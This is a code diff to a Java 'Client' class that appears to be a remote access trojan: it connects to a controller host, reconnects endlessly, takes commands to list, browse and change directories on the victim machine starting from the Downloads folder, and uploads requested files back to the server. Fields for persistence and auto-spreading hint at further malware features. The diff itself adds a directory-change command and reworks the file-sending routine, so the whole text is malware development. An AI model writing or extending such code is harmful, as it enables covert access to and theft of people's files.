@@ -10,8 +10,9 @@ public class Client {
     private boolean isPersistent = false;
     private boolean autoSpread = false;
     private Socket socket;
-    private DataOutputStream writer;
+    private DataOutputStream dos;
     private File directory;
+    private DataInputStream dis;
 
 
     private static String getHOST() {
@@ -55,9 +56,10 @@ public class Client {
     private void connect() throws InterruptedException {
         try {
             socket = new Socket(getHOST(), getPORT());
-            writer = new DataOutputStream(socket.getOutputStream());
+            dos = new DataOutputStream(socket.getOutputStream());
+            dis = new DataInputStream(socket.getInputStream());
+
             System.out.println("Client started: " + getHOST() + ":" + getPORT());
-            DataInputStream dis = new DataInputStream(socket.getInputStream());
             while (true) {
                 String input;
                 try {
@@ -71,11 +73,13 @@ public class Client {
                 } else if (input.contains("FILELIST")) {
                     communicate("FILELIST");
                     sendFileList();
-                } else if (input.contains("DIRECTORYUP")){
+                } else if (input.contains("DIRECTORYUP")) {
                     communicate("DIRECTORYUP");
                     directoryUp();
+                } else if (input.contains("CHNGDIR")) {
+                    communicate("CHNGDIR");
+                    directoryChange();
                 } else if (input.contains("DOWNLOAD")) {
-                    communicate("DOWNLOAD");
                     sendFile();
                 } else if (input.equals("EXIT")) {
                     communicate("EXIT");
@@ -85,7 +89,7 @@ public class Client {
                     System.exit(0);
                 }
             }
-        } catch (IOException e) {
+        } catch (Exception e) {
             /* Continually retry connection until established. */
             System.out.println("Attempting to reconnect...");
             connect();
@@ -95,7 +99,7 @@ public class Client {
     /* Sends a message to the Server. */
     private void communicate(String msg) {
         try {
-            writer.writeUTF(msg);
+            dos.writeUTF(msg);
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -103,7 +107,7 @@ public class Client {
 
     private void communicate(int msg) {
         try {
-            writer.writeInt(msg);
+            dos.writeInt(msg);
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -161,17 +165,27 @@ public class Client {
         mauscs.delete();
     }
 
-    private void directoryUp(){
-        if(directory != null) {
+    private void directoryUp() {
+        if (directory != null) {
             directory = directory.getParentFile();
         }
     }
+
+    private void directoryChange() throws IOException {
+        if (directory != null) {
+            String directoryName = dis.readUTF();
+            directory = new File(directory.getAbsolutePath() + "/" + directoryName);
+            directory.isDirectory();
+        }
+    }
+
     private void sendFileList() {
-        if(this.directory == null) {
+        if (this.directory == null) {
             String directory = System.getProperty("user.home") + "/Downloads/";
             this.directory = new File(directory);
             this.directory.isDirectory();
         }
+        System.out.println(directory);
         File[] files = new File(directory.getAbsolutePath()).listFiles();
         communicate(directory.getAbsolutePath());
         assert files != null;
@@ -184,10 +198,10 @@ public class Client {
     }
 
     private void sendFile() {
-        try (DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
-             DataInputStream dis = new DataInputStream(socket.getInputStream())) {
+        try {
+            communicate("DOWNLOAD");
             String fileName = dis.readUTF();
-            File filetoDownload = new File(directory.getAbsolutePath() + "/" +fileName);
+            File filetoDownload = new File(directory.getAbsolutePath() + "/" + fileName);
             Long length = filetoDownload.length();
             dos.writeLong(length);
             dos.writeUTF(fileName);
